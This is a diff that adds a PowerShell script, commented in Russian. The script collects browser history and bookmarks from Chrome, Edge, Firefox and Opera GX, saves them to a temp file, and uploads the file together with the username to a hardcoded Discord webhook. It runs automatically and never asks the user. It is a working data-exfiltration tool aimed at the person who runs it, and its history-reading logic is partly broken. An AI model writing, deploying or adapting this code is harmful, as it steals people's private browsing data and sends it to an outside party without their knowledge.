@@ -1,0 +1,206 @@
+# ============================
+# 1. Get-BrowserData.ps1
+# ============================
+
+function Get-BrowserData {
+
+    [CmdletBinding()]
+    param (    
+        [Parameter(Position=0, Mandatory=$true)]
+        [ValidateSet("chrome", "edge", "firefox", "opera")]
+        [string]$Browser,
+
+        [Parameter(Position=1, Mandatory=$true)]
+        [ValidateSet("history", "bookmarks")]
+        [string]$DataType
+    )
+
+    switch ("$Browser|$DataType") {
+        "chrome|history"   { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
+        "chrome|bookmarks" { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
+        "edge|history"     { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History" }
+        "edge|bookmarks"   { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks" }
+        "firefox|history"  { 
+            $profilePath = Get-ChildItem "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory | 
+                            Where-Object { $_.Name -like "*.default-release" } | Select-Object -First 1
+            if ($null -eq $profilePath) { Write-Warning "Firefox профиль не найден"; return }
+            $Path = Join-Path $profilePath.FullName "places.sqlite"
+        }
+        "opera|history"    { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
+        "opera|bookmarks"  { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" }
+        default {
+            Write-Warning "Комбинация браузера и типа данных не поддерживается."
+            return
+        }
+    }
+
+    if (-not (Test-Path $Path)) {
+        Write-Warning "Файл не найден: $Path"
+        return
+    }
+
+    if ($DataType -eq "history") {
+        if ($Path -like "*.sqlite") {
+            $tempDb = Join-Path $env:TEMP ("temp_" + [System.Guid]::NewGuid().ToString() + ".sqlite")
+            Copy-Item -Path $Path -Destination $tempDb -Force
+
+            $query = "SELECT url FROM urls WHERE url LIKE 'http%' LIMIT 100;"
+
+            $result = & sqlite3.exe -csv -header $tempDb $query 2>$null
+            Remove-Item -Path $tempDb -Force
+
+            if (-not $result) { return }
+
+            $urls = $result | ConvertFrom-Csv | Select-Object -ExpandProperty url | Sort-Object -Unique
+
+            foreach ($url in $urls) {
+                [PSCustomObject]@{
+                    User    = $env:UserName
+                    Browser = $Browser
+                    DataType= $DataType
+                    Data    = $url
+                }
+            }
+        }
+        else {
+            Write-Warning "Формат файла истории не поддерживается или требует sqlite3.exe: $Path"
+        }
+    }
+    elseif ($DataType -eq "bookmarks") {
+        $jsonRaw = Get-Content -Path $Path -Raw
+        try {
+            $jsonData = $jsonRaw | ConvertFrom-Json
+        }
+        catch {
+            Write-Warning "Ошибка парсинга JSON файла закладок."
+            return
+        }
+
+        function Extract-Bookmarks($node) {
+            if ($null -eq $node) { return }
+
+            if ($node.url) {
+                [PSCustomObject]@{
+                    User    = $env:UserName
+                    Browser = $Browser
+                    DataType= $DataType
+                    Data    = $node.url
+                }
+            }
+
+            if ($node.children) {
+                foreach ($child in $node.children) {
+                    Extract-Bookmarks $child
+                }
+            }
+        }
+
+        if ($jsonData.roots) {
+            foreach ($root in $jsonData.roots.PSObject.Properties.Value) {
+                Extract-Bookmarks $root
+            }
+        }
+        else {
+            Write-Warning "Неизвестная структура JSON закладок."
+        }
+    }
+}
+
+# ============================
+# 2. Upload-Discord.ps1
+# ============================
+
+function Upload-Discord {
+
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory=$false)]
+        [string]$File,
+
+        [Parameter(Mandatory=$false)]
+        [string]$Text
+    )
+
+    $hookUrl = "https://discord.com/api/webhooks/1380227013494964224/eHfXtEMA2iGWfKMp4Zl7bXfYjfalv7HstL1mlQcB1v32hFsF-VV1RuYU7z9sLCmMa2Ir"
+
+    if (-not ([string]::IsNullOrEmpty($Text))) {
+        $Body = @{
+            username = $env:UserName
+            content = $Text
+        } | ConvertTo-Json -Depth 3
+
+        try {
+            Invoke-RestMethod -ContentType 'application/json' -Uri $hookUrl -Method Post -Body $Body
+        }
+        catch {
+            Write-Warning "Ошибка отправки текста в Discord: $_"
+        }
+    }
+
+    if (-not ([string]::IsNullOrEmpty($File))) {
+        if (-not (Test-Path $File)) {
+            Write-Warning "Файл не найден для отправки в Discord: $File"
+            return
+        }
+
+        try {
+            $boundary = [System.Guid]::NewGuid().ToString()
+            $LF = "`r`n"
+            $contentDisposition = "form-data; name=`"file1`"; filename=`"" + (Split-Path $File -Leaf) + "`""
+            $fileBytes = [System.IO.File]::ReadAllBytes($File)
+
+            $bodyLines = (
+                "--$boundary",
+                "Content-Disposition: $contentDisposition",
+                "Content-Type: application/octet-stream",
+                "",
+                [System.Text.Encoding]::Default.GetString($fileBytes),
+                "--$boundary--",
+                ""
+            )
+
+            $body = [System.Text.Encoding]::Default.GetBytes(($bodyLines -join $LF))
+
+            $headers = @{
+                "Content-Type" = "multipart/form-data; boundary=$boundary"
+            }
+
+            Invoke-RestMethod -Uri $hookUrl -Method Post -Headers $headers -Body $body
+        }
+        catch {
+            Write-Warning "Ошибка отправки файла в Discord: $_"
+        }
+    }
+}
+
+# ============================
+# 3. Main Execution
+# ============================
+
+$outputFile = Join-Path $env:TEMP "--BrowserData.txt"
+if (Test-Path $outputFile) { Remove-Item $outputFile -Force }
+
+# Сбор данных из браузеров
+$browsers = @("edge", "chrome", "firefox", "opera")
+$dataTypes = @("history", "bookmarks")
+
+foreach ($browser in $browsers) {
+    foreach ($dataType in $dataTypes) {
+        try {
+            $results = Get-BrowserData -Browser $browser -DataType $dataType
+            if ($results) {
+                $results | Out-File -FilePath $outputFile -Append -Encoding UTF8
+            }
+        }
+        catch {
+            Write-Warning "Ошибка при обработке $browser $dataType: $_"
+        }
+    }
+}
+
+# Отправка файла в Discord, если он существует и не пустой
+if ((Test-Path $outputFile) -and ((Get-Item $outputFile).Length -gt 0)) {
+    Upload-Discord -File $outputFile -Text "Собранные данные браузеров пользователя $env:UserName"
+} else {
+    Upload-Discord -Text "Данные браузеров не были собраны или файл пуст."
+}
